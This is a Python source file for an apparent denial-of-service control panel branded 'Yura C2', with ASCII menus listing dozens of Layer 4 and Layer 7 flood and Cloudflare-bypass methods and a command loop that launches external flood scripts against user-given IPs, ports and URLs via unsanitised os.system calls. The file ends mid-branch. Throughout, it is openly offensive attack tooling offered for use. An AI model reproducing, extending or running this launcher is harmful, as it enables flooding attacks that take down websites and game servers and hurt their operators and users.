from asyncio import sleep
import undetected_chromedriver as webdriver
import socket
import os
import requests
import random
import getpass
import time
import sys
import json
import platform
import socket, threading, time, random, cloudscraper, requests
import socket, threading, time, ipaddress, random, json
from colorama import Fore, init

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
#cnc port#
C2_ADDRESS  = "8.8.8.8"
C2_PORT     = 6667

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
#bot#
bot = open('bot.py')

proxys = open('proxies.txt').readlines()
bots = len(proxys) 

def si():
    print(f"         \x1b]2;ZxC C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
    print("")

def tools():
    clear()
    print(f''' connecting too Yura C2 Net Panel ''')
    time.sleep(3) 
    clear()   
    si()
    print(f'''
                                  ▄· ▄▌▄• ▄▌▄▄▄   ▄▄▄·    ▐ ▄ ▄▄▄ .▄▄▄▄▄
                              ▐█▪██▌█▪██▌▀▄ █·▐█ ▀█   •█▌▐█▀▄.▀·•██
                              ▐█▌▐█▪█▌▐█▌▐▀▀▄ ▄█▀▀█   ▐█▐▐▌▐▀▀▪▄ ▐█.▪
                               ▐█▀·.▐█▄█▌▐█•█▌▐█ ▪▐▌  ██▐█▌▐█▄▄▌ ▐█▌·
                                ▀ •  ▀▀▀ .▀  ▀ ▀  ▀   ▀▀ █▪ ▀▀▀  ▀▀▀  
                                ═════════╦════════════════╦══════════
                        ╔════════════════╩════════════════╩═════════════════╗
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► geoip            ║ L ║  ► masn-lookup      ║ L ║  ►                  ║
             ║  ► reverseip        ║   ║  ► mdns-lookup      ║   ║  ►                  ║
             ║  ► subnet-lookup    ║   ║  ► reverse-dns      ║   ║  ►                  ║
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
''')

def ports():
    clear()
    print(f''' connecting too Yura C2 Net Panel ''')
    time.sleep(3) 
    clear()   
    si()
    print(f'''
                            ▄· ▄▌▄• ▄▌▄▄▄   ▄▄▄·    ▐ ▄ ▄▄▄ .▄▄▄▄▄
                              ▐█▪██▌█▪██▌▀▄ █·▐█ ▀█   •█▌▐█▀▄.▀·•██
                              ▐█▌▐█▪█▌▐█▌▐▀▀▄ ▄█▀▀█   ▐█▐▐▌▐▀▀▪▄ ▐█.▪
                               ▐█▀·.▐█▄█▌▐█•█▌▐█ ▪▐▌  ██▐█▌▐█▄▄▌ ▐█▌·
                                ▀ •  ▀▀▀ .▀  ▀ ▀  ▀   ▀▀ █▪ ▀▀▀  ▀▀▀  
                                ═════════╦════════════════╦══════════
                        ╔════════════════╩════════════════╩═════════════════╗
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► 21 - SFTP        ║ L ║  ► 25 - SMTP        ║ L ║  ► 69 - TFTP        ║
             ║  ► 22 - SSH         ║   ║  ► 53 - DNS         ║   ║  ► 80 - HTTP        ║
             ║  ► 23 - TELNET      ║   ║  ► 25 - EMPTY       ║   ║  ► 443 - HTTPS      ║
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
             ╔══════════╩═══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► 3074 - XBOX       ║ L ║  ► 5060 - RIP       ║ L ║  ►                  ║
             ║  ► 5060 - PLAYSTAT   ║   ║  ► 30120 - FIVEM    ║   ║  ►                  ║
             ║  ► 25565 - MINECRAFT ║   ║  ►                  ║   ║  ►                  ║
             ╚══════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
''')

def layer7():
    clear()
    print(f''' connecting too Yura C2 Net Panel ''')
    time.sleep(3) 
    clear()   
    si()
    print(f'''
                              ▄· ▄▌▄• ▄▌▄▄▄   ▄▄▄·    ▐ ▄ ▄▄▄ .▄▄▄▄▄
                              ▐█▪██▌█▪██▌▀▄ █·▐█ ▀█   •█▌▐█▀▄.▀·•██
                              ▐█▌▐█▪█▌▐█▌▐▀▀▄ ▄█▀▀█   ▐█▐▐▌▐▀▀▪▄ ▐█.▪
                               ▐█▀·.▐█▄█▌▐█•█▌▐█ ▪▐▌  ██▐█▌▐█▄▄▌ ▐█▌·
                                ▀ •  ▀▀▀ .▀  ▀ ▀  ▀   ▀▀ █▪ ▀▀▀  ▀▀▀  
                                ═════════╦════════════════╦══════════
                        ╔════════════════╩════════════════╩═════════════════╗
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► http-raw         ║ L ║  ► http-rand        ║ L ║  ► mix              ║ ► HTTPS-LOAD
             ║  ► http-socket      ║   ║  ► cf-bypass        ║   ║  ► cf-pro           ║► HTTPS-PUNCH
             ║  ► ovh              ║   ║  ► cf-socket        ║   ║  ► httpflood        ║ ► cf-upd
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► crash            ║ L ║  ► https-spoof      ║ L ║  ► dandier          ║ ► ZX
             ║  ► hyper            ║   ║  ► killer           ║   ║  ► tlsvip           ║
             ║  ► slow             ║   ║  ► flood            ║   ║  ► stress           ║
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
''')
    
def yura():
    clear()
    print(f''' connecting too Yura C2 Net Panel ''')
    time.sleep(3) 
    clear()   
    si()
    print(f'''
                              ▄· ▄▌▄• ▄▌▄▄▄   ▄▄▄·    ▐ ▄ ▄▄▄ .▄▄▄▄▄
                              ▐█▪██▌█▪██▌▀▄ █·▐█ ▀█   •█▌▐█▀▄.▀·•██
                              ▐█▌▐█▪█▌▐█▌▐▀▀▄ ▄█▀▀█   ▐█▐▐▌▐▀▀▪▄ ▐█.▪
                               ▐█▀·.▐█▄█▌▐█•█▌▐█ ▪▐▌  ██▐█▌▐█▄▄▌ ▐█▌·
                                ▀ •  ▀▀▀ .▀  ▀ ▀  ▀   ▀▀ █▪ ▀▀▀  ▀▀▀  
                                ═════════╦════════════════╦══════════
                        ╔════════════════╩════════════════╩═════════════════╗
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► https-storm      ║ L ║  ► http-requests    ║ L ║  ► http-high        ║
             ║  ► https-rand       ║   ║  ► http-vip         ║   ║  ► https-engine     ║
             ║  ► http-dstat       ║   ║  ► httpget          ║   ║  ►   HULK-VIP                 ║
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► https-crawlv2    ║ L ║  ► https-raw        ║ L ║  ► crash-vip        ║
             ║  ► https-crawl      ║   ║  ► https-get        ║   ║  ► yura-vip         ║
             ║  ► http-nullv2      ║   ║  ► kill-vip         ║   ║  ► tls-vip          ║
             ║  ► https-vip        ║   ║  ► ssh-vip          ║   ║  ► https-ua         ║
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► Yura-Byone       ║ L ║  ►  tly               ║ L ║  ► KILLC2           ║
             ║  ► https-hold       ║   ║  ► https-strong              ║   ║  ►  HTTPS-SPAM            ║
             ║  ► big-vip          ║   ║  ►  http-strong             ║   ║  ►                ║
             ║  ► HTTP-Yura                  ║   ║  ►  BROWSER-VIP                ║   ║  ►                  ║
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝

''')

def layer4():
    clear()
    print(f''' connecting too Yura C2 Net Panel ''')
    time.sleep(3) 
    clear()   
    si()
    print(f'''
                                ▄· ▄▌▄• ▄▌▄▄▄   ▄▄▄·    ▐ ▄ ▄▄▄ .▄▄▄▄▄
                              ▐█▪██▌█▪██▌▀▄ █·▐█ ▀█   •█▌▐█▀▄.▀·•██
                              ▐█▌▐█▪█▌▐█▌▐▀▀▄ ▄█▀▀█   ▐█▐▐▌▐▀▀▪▄ ▐█.▪
                               ▐█▀·.▐█▄█▌▐█•█▌▐█ ▪▐▌  ██▐█▌▐█▄▄▌ ▐█▌·
                                ▀ •  ▀▀▀ .▀  ▀ ▀  ▀   ▀▀ █▪ ▀▀▀  ▀▀▀  
                                ═════════╦════════════════╦══════════
                        ╔════════════════╩════════════════╩═════════════════╗
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► udp              ║   ║  ► stress           ║   ║  ► samplite         ║ ► samp-go
             ║  ► samp             ║ L ║  ► home             ║ L ║  ► samppro          ║
             ║  ► udpbypass        ║   ║  ► god              ║   ║  ► sampvip          ║
             ║  ► destroy          ║   ║  ► soon             ║   ║  ► soon             ║
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝

''') 

def menu(): 
     sys.stdout.write(f"         \x1b]2;FzD C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07") 
     clear() 
     print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to FzD C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: FzD Team \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.2\x1b[38;2;0;255;255m | \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m]') 
     print("") 
     print(""" 
         ██╗   ██╗██╗   ██╗██████╗  █████╗      ██████╗██████╗     ███╗   ██╗███████╗████████╗
         ╚██╗ ██╔╝██║   ██║██╔══██╗██╔══██╗    ██╔════╝╚════██╗    ████╗  ██║██╔════╝╚══██╔══╝
          ╚████╔╝ ██║   ██║██████╔╝███████║    ██║      █████╔╝    ██╔██╗ ██║█████╗     ██║   
           ╚██╔╝  ██║   ██║██╔══██╗██╔══██║    ██║     ██╔═══╝     ██║╚██╗██║██╔══╝     ██║   
            ██║   ╚██████╔╝██║  ██║██║  ██║    ╚██████╗███████╗    ██║ ╚████║███████╗   ██║   
            ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝╚══════╝    ╚═╝  ╚═══╝╚══════╝   ╚═╝   
                                ═════════╦════════════════╦══════════
                        ╔════════════════╩════════════════╩═════════════════╗
             ╔══════════╩═══════════════════════════════════════════════════╩══════════╗
             ║                         Welcome To Yura C2 Panel                        ║
             ║  This Tools Is Not For Sell , Only Use For Personal Use And 177 Members ║
             ║                               Crew Only                                 ║
             ║                                                                         ║
             ╚═════════════════════════════════════════════════════════════════════════╝
                        ╔════════════════╩════════════════╩═════════════════╗
             ╔══════════╩════╦══════════════════════════════════════════════╩══════════╗
             ║ ► CLEAR       ║  CLEAR OPTION                                           ║
             ║ ► TOOLS       ║  SHOW TOOLS                                             ║
             ║ ► SPECIAL      ║  SPECIAL METHOD                                        ║           
             ║ ► PORTS       ║  SHOW ALL PORT                                          ║
             ║ ► LAYER 4     ║  SHOW LAYER 4 METHOD                                    ║
             ║ ► LAYER 7     ║  SHOW LAYER 7 METHOD                                    ║
             ║ ► VIPCMD    ║  SHOW VIP METHOD         
             ║ ► ONGOING  ║  SHOW RUNNING ATTACK                                       ║
             ╚═══════════════╩═════════════════════════════════════════════════════════╝
 """)
 
def main():
    menu()
    while(True):
        cnc = input('''YuraC2 Net > ''')
        if "layer7" in cnc or "l7" in cnc or "LAYER7" in cnc or "L7" in cnc:
            layer7()
        elif "layer4" in cnc or "LAYER4" in cnc or "L4" in cnc or "l4" in cnc:
            layer4()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif "ports" in cnc or "PORTS" in cnc or "ports" in cnc or "portss" in cnc:
            ports()
        elif "tools" in cnc or "tool" in cnc or "TOOLS" in cnc or "TOOL" in cnc:
            tools()
        elif "VIPCMD" in cnc or "Vipcmd" in cnc or "vipcmd" in cnc or "VipCmd" in cnc:
            yura()
        elif "ongoing" in cnc or "ONGOING" in cnc or "Ongoing" in cnc or "OnGoinG" in cnc:
            ongoing()
# LAYER 4 METHODS   

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                device_name = platform.system()
                os.system(f'perl god.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: god <ip> <port> <time>')
                print('Example: god 1.1.1.1 80 60')
                
        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                device_name = platform.system()
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')
                
        elif "samppro" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'python3 samp-pro.py {ip} {port} {time} {thread}')
            except IndexError:
                print('Usage: samppro <ip> <port> <time> <thread>')
                print('Example: samppro 1.1.1.1 80 60 1000')                

        elif "sampvip" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                thread = cnc.split()[4]
                device_name = platform.system()
                os.system(f'python3 samp-vip.py {ip} {port} {time} {thread}')
            except IndexError:
                print('Usage: sampvip <ip> <port> <time> <thread>')
                print('Example: sampvip 1.1.1.1 80 60 1000')                
                
        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('Usage: home <ip> <port> <packet_size> <time>')
                print('Example: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                device_name = platform.system()
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('Usage: udp <ip> <port>')
                print('Example: udp 1.1.1.1 80')
                
        elif "samplite" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                device_name = platform.system()
                os.system(f'python3 samp-lite.py {ip} {port}')
            except IndexError:
                print('Usage: samplite <ip> <port>')
                print('Example: samplite 1.1.1.1 80')
                
        elif "samp-go" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'python3 samp-go.py {ip} {port} {time} {thread}')
            except IndexError:
                print('Usage: samp-go <ip> <port> <time> <thread>')
                print('Example: samp-go 1.1.1.1 80 60 1000')               
# SPECIAL METHODS

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                device_name = platform.system()
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                device_name = platform.system()
                os.system(f'python2 samp.py {ip} {port}')
            except IndexError:
                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')

# LAYER 7 METHODS
     
        elif "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                device_name = platform.system()
                os.system(f'python3 https-spoof.py {url} {time} {thread}')
            except IndexError:
                print('Usage: https-spoof <url> <time> <threads>')
                print('Example: https-spoof http://vailon.com 60 500')
    
        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                device_name = platform.system()
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('Usage: slow <url> <time>')
                print('Example: slow http://vailon.com 60')
    
        elif "hyper" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node hyper.js {url} {time}')
            except IndexError:
                print('Usage: hyper <url> <time>')
                print('Example: hyper http://vailon.com 60')
                
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
    
        elif "cf-pro" in cnc:
            try:
                os.system(f'python3 cf-pro.py')
            except IndexError:
                print('cf-pro')
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                device_name = platform.system()
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                device_name = platform.system()
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('Usage: http-raw <url> <time>')
                print('Example: http-raw http://example.com 60')

        elif "tls" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                os.system(f'node tls.js {url} {thread}')
            except IndexError:
                print('Usage: tls <url> <thread>')
                print('Example: tls http://example.org 120')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                device_name = platform.system()
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: http-rand <url> <time>')
                print('Example: http-rand http://vailon.com/ 60')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                device_name = platform.system()
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')

        elif "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                device_name = platform.system()
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('Usage: uambypass <url> <time> <req_per_ip>')
                print('Example: uambypass http://example.com 60 1250')

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                device_name = platform.system()
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                device_name = platform.system()
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')
                
        elif "dandier" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                device_name = platform.system()
                os.system(f'java dandier.java {url} {thread}')
            except IndexError:
                print('Usage: dandier <url> <threads>')
                print('Example: dandier http://example.com 15000')

        elif "ovh" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                time = cnc.split()[3]
                device_name = platform.system()
                os.system(f'python3 start.py OVH {url} 4 {thread} http.txt 61 {time}')
            except IndexError:
                print('Usage: ovh <url> <thread> <time>')
                print('Example: ovh https://xnxx.com 800 60')
                
        elif "killer" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run KILL.go -site {url} -data {method}')
            except IndexError:
                print('Usage: killer <url> METHODS<GET/POST>')
                print('Example: killer http://example.com GET')                     
                
        elif "mix" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                device_name = platform.system()
                os.system(f'node mix.js {url} {time}')
            except IndexError:
                print('Usage: mix <url> <time>')
                print('Example: mix https://xnxx.com 60')
                
        elif "cf-upd" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                device_name = platform.system()
                os.system(f'python3 cloudFare.py {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-upd <url> <time> <threads>')
                print('Example: cf-upd http://example.com 60 1250')
                
                
# VVIP LAYER 7
        elif "http-dstat" in cnc:
            try:
                url = cnc.split()[1]
                connections = cnc.split()[2]
                rps = cnc.split()[3]
                os.system(f'perl dstat.pl {url} {connections} {rps} 13.87')
            except IndexError:
                print('Usage: http-dstat <url> <connections> <rps>')
                print('Example: http-dstat http://example.org 50000 50000')

        elif "httpfuzz" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node httpfuzz.js {url} proxy.txt {time} POS')
            except IndexError:
                print('Usage: httpfuzz <url> <time>')
                print('Example: httpfuzz http://example.org 60')

        elif "http-vip" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run HTTP.go -site {url} -data {method}')
            except IndexError:
                print('Usage: http-vip <url> METHODS<GET/POST>')
                print('Example: http-vip http://example.com GET')

        elif "https-vip" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run HTTPS.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')

        elif "crash-vip" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run CRASH.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')
        
        elif "yura-vip" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run YURA.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')

        elif "socket-vip" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run SOCKET.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')

        elif "ssh-vip" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run SSH.go -site {url} -data {method}')
            except IndexError:
                print('Usage: ssh-vip <url> METHODS<GET/POST>')
                print('Example: ssh-vip http://example.com GET')       
        elif "kill-vip" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run KILL.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')                                           
        elif "tls-vip" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run TLS.go -site {url} -data {method}')
            except IndexError:
                print('Usage: tls-vip <url> METHODS<GET/POST>')
                print('Example: tls-vip http://example.com GET')        

        elif "browser-vip" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run BROWSER.go -site {url} -data {method}')
            except IndexError:
                print('Usage: browser-vip <url> <GET/POST>')
                print('Example: browser-vip https://example.com GET')
       
        elif "https-crawlv2" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-CRAWLV2.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: https-crawlv2 <url> <threads> METHODS<GET/POST> <time>')
                print('Example: HTTPS-CRAWLV2 http://example.com 15000 get 60')

        elif "https-ua" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-SLOW-UA.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: https-ua <url> <threads> METHODS<GET/POST> <time>')
                print('Example: https-ua http://example.com 15000 get 60')

        elif "https-high" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-HIGH.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: https-high <url> <threads> METHODS<GET/POST> <time>')
                print('Example: https-high http://example.com 15000 get 60')

        elif "https-engine" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-ENGINE.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: https-engine <url> <threads> METHODS<GET/POST> <time>')
                print('Example: https-engine http://example.com 15000 get 60')
        
        elif "http-nullv2" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-NULLV2.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: http-nullv2 <url> <threads> METHODS<GET/POST> <time>')
                print('Example: http-nullv2 http://example.com 15000 get 60')        
        elif "https-crawl" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-CRAWL.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: https-crawl <url> <threads> METHODS<GET/POST> <time>')
                print('Example: https-crawl http://example.com 15000 get 60')

        elif "https-get" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-GET.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: https-get <url> <threads> METHODS<GET/POST> <time>')
                print('Example: https-get http://example.com 15000 get 60')
        elif "https-raw" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTP-RAW.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: https-raw <url> <threads> METHODS<GET/POST> <time>')
                print('Example: https-raw http://example.com 15000 get 60')

        elif "https-rand" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-RAND.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: https-rand <url> <threads> METHODS<GET/POST> <time>')
                print('Example: https-rand http://example.com 15000 get 60')

        elif "https-storm" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-STORM.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: https-storm <url> <threads> METHODS<GET/POST> <time>')
                print('Example: https-storm http://example.com 15000 get 60')

        elif "Yura-Byone" in cnc:
            try:
                url = cnc.split()[1]
                port = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run byone.go -site {url} -data {method}')
            except IndexError:
                print('Usage: Yura-Byone <url> <port> METHODS<GET/POST> <time>')
                print('Example: Yura-Byone http://example.com 443 GET 100')
                
        elif "big-vip" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run BIGGER.go -site {url} -data {method}')
            except IndexError:
                print('Usage: big-vip <url> METHODS<GET/POST>')
                print('Example: big-vip http://example.com GET')        
                
        elif "https-hold" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run HTTPS-HOLD.go -site {url} -data {method}')
            except IndexError:
                print('Usage: https-hold <url> METHODS<GET/POST>')
                print('Example: https-hold http://example.com GET')   
     
        elif "HTTPS-LOAD" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run HTTP-GOV.go -site {url} -data {method}')
            except IndexError:
                print('Usage: HTTPS-LOAD <url> METHODS<GET/POST>')
                print('Example: HTTPS-LOAD  http://example.com GET')   
  
        elif "HTTPS-PUNCH" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run PUNCHMAN.go -site {url} -data {method}')
            except IndexError:
                print('Usage: HTTPS-PUNCH <url> METHODS<GET/POST>')
                print('Example: HTTPS-PUNCH http://example.com GET')      

        elif "https-strong" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run strongman.go -site {url} -data {method}')
            except IndexError:
                print('Usage: https-strong <url> METHODS<GET/POST>')
                print('Example: https-strong http://example.com GET')  

        elif "tly" in cnc:
            try:
                url = cnc.split()[1]
                port = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run TLSYura.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLY <url> <port> METHODS<GET/POST> <time>')
                print('Example: TLY http://example.com 443 GET 60')          
                    
        elif "HTTP-Yura" in cnc:
            try:
                url = cnc.split()[1]
                port = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPYura.go -site {url} -data {method}')
            except IndexError:
                print('Usage: HTTP-Yura <url> <port> METHODS<GET/POST> <time>')
                print('Example: HTTP-Yura http://example.com 443 GET 60')      
               
        elif "BROWSER-VIP" in cnc:
            try:
                url = cnc.split()[1]
                port = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run BROWSER.go -site {url} -data {method}')
            except IndexError:
                print('Usage: BROWSER-VIP <url> <port> METHODS<GET/POST> <time>')
                print('Example: BROWSER-VIP http://example.com 443 GET 60')        
                
        elif "HULK-VIP" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk-Yura.go -site {url} -data {method}')
            except IndexError:
                print('Usage: Hulk <url> METHODS<GET/POST>')
                print('Example: Hulk http://example.com GET')
                
        elif "http-strong" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run HTTPSTRONG.go -site {url} -data {method}')
            except IndexError:
